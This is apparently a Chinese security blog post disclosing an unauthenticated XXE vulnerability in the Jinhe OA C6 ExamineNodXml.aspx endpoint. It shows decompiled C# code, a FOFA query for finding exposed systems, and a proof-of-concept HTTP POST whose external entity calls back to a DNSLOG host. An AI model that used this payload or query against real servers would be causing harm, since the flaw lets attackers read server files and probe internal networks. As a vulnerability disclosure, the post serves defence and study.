---
title: "金和OA ExamineNodXml.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-ExamineNodXml-xxe.html
asset_dir: assets/金和oa-examinenodxml.aspx-xxe漏洞
---

# 金和OA ExamineNodXml.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/1/25 13:31
- 216浏览
- [0评论](#comment)
- 12分钟阅读

深入探索

恶意软件分析工具

代码安全审计

企业安全咨询

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `ExamineNodXml.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞扫描服务

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `ExamineNodXml.aspx` 在 `bin` 目录下查找 `JHSoft.Web.ExamineNod.dll` 将其进行反编译后找到 **ExamineNodXml** 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  this.htc = ((CultureInfo) this.Session["culture"]).Name + ".css";
  this.InitText();
  this.m_ExamineNod.Path = this.Server.MapPath("../bin").ToString() + "\\";
  DateTime dateTime1 = DateTime.Now;
  dateTime1 = dateTime1.AddDays(-7.0);
  this.startDate = dateTime1.ToShortDateString();
  this.endDate = DateTime.Now.ToShortDateString();
  string end = ((TextReader) new StreamReader(this.Request.InputStream)).ReadToEnd();
  XmlDocument xmlDocument = new XmlDocument();
  xmlDocument.LoadXml(end);
```

深入探索

授权

云安全解决方案

防火墙软件

请求内容直接使 `XmlDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

```
POST /c6/Jhsoft.Web.govset/ExamineNodXml.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到请求

网络安全

[![金和OA ExamineNodXml.aspx XXE漏洞](images/img-001-ab40f77f1ff8.webp)](https://image.mrxn.net/b12efeef8c1a4140adbccbbbda98c37e.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
